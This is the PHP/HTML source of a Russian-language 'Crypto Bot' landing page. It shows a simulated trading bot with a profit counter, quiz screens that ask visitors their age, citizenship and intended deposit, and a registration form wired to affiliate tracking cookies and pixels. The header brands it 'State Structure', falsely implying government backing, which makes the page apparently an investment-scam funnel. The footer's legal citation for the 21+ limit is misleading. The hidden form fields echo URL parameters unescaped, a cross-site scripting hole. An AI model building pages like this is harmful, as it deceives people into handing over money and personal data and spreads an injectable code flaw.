<?php
// if (!isset($rawClick) && !isset($click)) {
//   die();
// }
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Crypto Bot</title>
    <link rel="stylesheet" href="./styles/styles.css?v=87456" />
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-chart-financial"></script>
    <script src="https://cdn.jsdelivr.net/npm/moment"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-moment"></script>
    <script src="jquery-3.6.1.min.js"></script>
    
    
    <script src="form/js/libs/intlTelInput.js"></script>
    
    <script>
    let scriptLoadings = false;
  // Функция для получения значения параметра из URL
  function getUrlParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

  // Проверяем наличие параметров
  const bgeValue = getUrlParam("bge");
  const crmSource = getUrlParam("crm_source");

  if (bgeValue) { 
    // Если есть только bgeValue – подключаем скрипты для bge
    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
    document.head.appendChild(inlineScript);

    // Подключаем второй скрипт для bge
    let asyncScript = document.createElement("script");
    asyncScript.src = "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
    document.head.appendChild(asyncScript);
    
    // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
    asyncScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
      console.log('Все скрипты для BGE загружены!');
    };

  } else if (!crmSource) { 
    // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
    let trackScript = document.createElement("script");
    trackScript.type = "application/javascript";
    trackScript.src = "track.js?v=21238";
    document.head.appendChild(trackScript);

    trackScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки track.js
      console.log('track.js загружен!');
      window.removeEventListener("beforeunload", trackClose);
    };

    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
    document.head.appendChild(inlineScript);

    inlineScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
      console.log('Inline script для альтернативы загружен!');
    };

    let parseScript = document.createElement("script");
    parseScript.type = "application/javascript";
    parseScript.src = "parse_url.js?v=19";
    document.head.appendChild(parseScript);
    
    scriptLoadings = true;

    parseScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
      console.log('parse_url.js загружен!');
    };
  }
</script>



    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
    
    
    
    
    
  </head>
  <body>
    <header class="header active">
      <img style="width: 70px;" src="patr.svg" alt="Logo" />
      <div class="header__text">
        <span>Государственная<br> Структура</span>
      </div>
    </header>
    <main class="main">
      <!--------- SCREEN 1 --------->
      <div id="screen-1" class="screen active">
        <div class="main-entry">
          <span class="main-entry__heading"
            >Попробуйте себя в трейдинге вместе с нашим ботом</span
          >
          <p class="main-entry__descr">
            Вам предоставлен демо счет, на котором вы можете провести свои
            первые сделки и посмотреть сколько вы сможете заработать
          </p>
          <button type="button" class="main-entry__button" id="entry-button">
            Начать торговлю
          </button>
        </div>
        <!--<div class="main-image">-->
        <!--<img src="./img/bg-main.png" alt="Background">-->
        <!--</div>-->
      </div>
      <!--------- SCREEN 2 --------->
      <div id="screen-2" class="screen second">
        <div class="second__wrapper">
          <div class="screen__controls-wrapper">
            <div class="screen__header">
              <div class="screen__profit">
                <span class="screen__profit-label">Прибыль</span>
                <span class="screen__profit-value">0 ₽</span>
              </div>
              <div class="screen__time">
                <span class="screen__time-label">Время работы</span>
                <div class="screen__time-value">
                  <img
                    src="./img/timer.svg"
                    alt="Timer"
                    class="screen__time-icon"
                  />
                  <span class="screen__time-timer"> 00:00 </span>
                </div>
              </div>
            </div>
    
            <div class="screen__bot-control">
              <button class="screen__bot-button" id="start-chart">
                Запустить бот
              </button>
            </div>
          </div>
  
  
          <div class="screen__chart-wrapper">
            <div class="screen__tabs">
              <button class="screen__tab screen__tab--active" data-pair="LCO">
                РУБ / LCO
              </button>
              <button class="screen__tab" data-pair="BTC">РУБ / BTC</button>
              <button class="screen__tab" data-pair="USD">РУБ / USD</button>
            </div>
    
            <div class="screen__chart-placeholder">
              <canvas id="chartCanvas" class="screen__chart"></canvas>
            </div>
          </div>
        </div>

          <!--------- QUESTION 1 --------->
        <div id="modal" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">Вам исполнился 21 год?</p>
            <div class="modal__actions">
              <button class="modal__button--first modal__button--yes">
                Да
              </button>
                <a href="err.html" class="modal__button--first modal__button--no">Нет</a>
            </div>
          </div>
        </div>
        <!--------- QUESTION 2 --------->
        <div id="modal-3" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">Являетесь ли вы гражданином Российской Федерации?</p>
            <div class="modal__actions">
              <button class="modal__button--third modal__button--yes">
                Да
              </button>
                <a href="err.html" class="modal__button--third modal__button--no">Нет</a>
            </div>
          </div>
        </div>
        <!--------- QUESTION 3 --------->
        <div id="modal-2" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">С какой суммы вы хотели бы начать работу?</p>
            <div class="modal__actions">
              <button class="modal__button--second modal__button--5">
                10 000 ₽
              </button>
              <button class="modal__button--second modal__button--10">
                15 000 ₽
              </button>
              <button class="modal__button--second modal__button--50">
                20 000 ₽
              </button>
            </div>
          </div>
        </div>
      </div>
      <!--------- SCREEN 3 --------->
      <div id="screen-3" class="screen">
        <div class="form-wrapper">
          <form
            class="form _main-form contact-form freg thin rounded"
            id="main-form"
            method="post"
          >
            <div class="text-block-6">
              <h2
                class="form-heading"
                style="text-align: center;"
              >
               <span class="heading-accent">Пройдите регистрацию</span> <br> для начала работы на платформе
              </h2>
            </div>
            <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
            <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
            <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
            type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
            type="hidden" id="source" value='<?= $_GET['source'] ?>'>
          </form>
        </div>
      </div>
    </main>
    <footer class="footer active">
      <p class="footer__text">
        Возможности платформы доступны только совершеннолетним пользователям 21+
        согласно "Трудовому кодексу Российской Федерации" от 30.12.2001 №197-ФЗ
        (ред. от 13.06.2023, с изм. от 27.06.2023).
      </p>
    </footer>
    <script src="./js/main.js?v=5"></script>
    <script src="./js/timer.js"></script>
    <script src="./js/chart.js"></script>
    <script src="loadAssets.js?v=85466"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
